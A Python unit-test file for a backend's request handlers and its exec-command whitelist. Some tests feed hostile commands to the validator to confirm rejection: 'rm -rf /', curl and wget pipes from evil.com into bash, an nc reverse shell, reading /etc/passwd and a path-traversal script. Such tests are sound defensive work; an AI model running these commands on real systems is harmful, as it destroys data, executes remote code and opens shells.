import io
import unittest
from unittest.mock import patch

from manager_tt_backend.server import ExecHandler
from manager_tt_backend.config import is_exec_command_allowed


class JsonBodyTests(unittest.TestCase):
    @staticmethod
    def _stub(body: bytes):
        class Stub:
            pass

        stub = Stub()
        stub.headers = {"Content-Length": str(len(body))}
        stub.rfile = io.BytesIO(body)
        return stub

    def test_read_json_body_accepts_object_payload(self) -> None:
        stub = self._stub(b'{"profile":"designer","dryRun":false}')

        payload = ExecHandler._read_json_body(stub)

        self.assertEqual(payload, {"profile": "designer", "dryRun": False})

    def test_read_json_body_rejects_non_object_payload(self) -> None:
        stub = self._stub(b'["designer"]')

        with self.assertRaisesRegex(ValueError, "对象"):
            ExecHandler._read_json_body(stub)


class ConfigRouteTests(unittest.TestCase):
    def test_save_config_returns_400_when_validation_failed(self) -> None:
        class Stub:
            command = "POST"

            def _read_json_body(self):
                return {"profile": "designer", "config": {"gateway": {"port": 19789}}, "restartAfterSave": False}

            def _request_meta(self):
                return {"requestId": "req-1"}

            def _send_json(self, status, body):
                self.response = (status, body)

            def _require_management_auth(self):
                pass  # Mock: skip auth check in tests

        stub = Stub()
        with (
            patch(
                "manager_tt_backend.server.save_config",
                return_value={"status": "failed", "restartAfterSave": False, "validate": {"returncode": 1}},
            ),
            patch("manager_tt_backend.server.record_manager_action") as record_manager_action,
        ):
            ExecHandler._handle_openclaw_config(stub)

        self.assertEqual(stub.response[0], 400)
        record_manager_action.assert_called_once()


class FeishuQrRouteTests(unittest.TestCase):
    def test_start_route_coerces_string_false_verbose_flag(self) -> None:
        class Stub:
            command = "POST"

            def _read_json_body(self):
                return {"profile": "designer", "verbose": "false"}

            def _request_meta(self):
                return {"requestId": "req-1"}

            def _send_json(self, status, body):
                self.response = (status, body)

            def _require_management_auth(self):
                pass  # Mock: skip auth check in tests

        stub = Stub()
        with (
            patch(
                "manager_tt_backend.server.start_feishu_qr_session",
                return_value={"profile": "designer", "status": "running"},
            ) as start_session,
            patch("manager_tt_backend.server.record_manager_action") as record_manager_action,
        ):
            ExecHandler._handle_openclaw_feishu_qr_start(stub)

        start_session.assert_called_once_with("designer", verbose=False)
        self.assertEqual(stub.response[0], 200)
        record_manager_action.assert_called_once()


class ExecWhitelistTests(unittest.TestCase):
    def test_ss_port_check_allowed(self) -> None:
        self.assertTrue(is_exec_command_allowed('ss -tlnp "sport = :6002" 2>/dev/null | grep -c LISTEN'))

    def test_ss_ltnpH_allowed(self) -> None:
        self.assertTrue(is_exec_command_allowed("ss -ltnpH || true"))

    def test_docker_inspect_allowed(self) -> None:
        self.assertTrue(is_exec_command_allowed('docker inspect -f "{{.State.Running}}" new-api 2>/dev/null | grep -c true'))

    def test_systemctl_show_allowed(self) -> None:
        self.assertTrue(is_exec_command_allowed("systemctl --user show openclaw-gateway.service -p Id -p ActiveState"))

    def test_journalctl_allowed(self) -> None:
        self.assertTrue(is_exec_command_allowed("journalctl --user -u openclaw-gateway -n 120 --no-pager"))

    def test_launcher_start_script_allowed(self) -> None:
        self.assertTrue(is_exec_command_allowed("bash /home/yun/桌面/workspace/manager-TT/start-od.sh"))
        self.assertTrue(is_exec_command_allowed("bash /home/yun/桌面/workspace/manager-TT/start-ccs.sh"))

    def test_launcher_stop_script_allowed(self) -> None:
        self.assertTrue(is_exec_command_allowed("bash /home/yun/桌面/workspace/manager-TT/stop-od.sh"))

    def test_project_start_stop_allowed(self) -> None:
        self.assertTrue(is_exec_command_allowed("cd /home/yun/桌面/workspace/next-ai-draw-io && bash start.sh"))
        self.assertTrue(is_exec_command_allowed("cd /home/yun/桌面/workspace/next-ai-draw-io && bash stop.sh"))

    def test_malicious_rm_rf_rejected(self) -> None:
        self.assertFalse(is_exec_command_allowed("rm -rf /"))
        self.assertFalse(is_exec_command_allowed("rm -rf /home"))

    def test_malicious_rm_r_rejected(self) -> None:
        self.assertFalse(is_exec_command_allowed("rm -r /home"))

    def test_wget_pipe_bash_rejected(self) -> None:
        self.assertFalse(is_exec_command_allowed("wget http://evil.com/script.sh | bash"))

    def test_nc_reverse_shell_rejected(self) -> None:
        self.assertFalse(is_exec_command_allowed("nc -e /bin/sh 192.168.1.1 4444"))

    def test_curl_bash_rejected(self) -> None:
        self.assertFalse(is_exec_command_allowed("curl http://evil.com/script.sh | bash"))

    def test_arbitrary_command_rejected(self) -> None:
        self.assertFalse(is_exec_command_allowed("cat /etc/passwd"))
        self.assertFalse(is_exec_command_allowed("id"))
        self.assertFalse(is_exec_command_allowed("whoami"))

    def test_empty_command_rejected(self) -> None:
        self.assertFalse(is_exec_command_allowed(""))
        self.assertFalse(is_exec_command_allowed(None))

    def test_path_traversal_in_script_rejected(self) -> None:
        # Scripts with path traversal should be rejected
        self.assertFalse(is_exec_command_allowed("bash /home/yun/桌面/workspace/manager-TT/../../../evil.sh"))


if __name__ == "__main__":
    unittest.main()
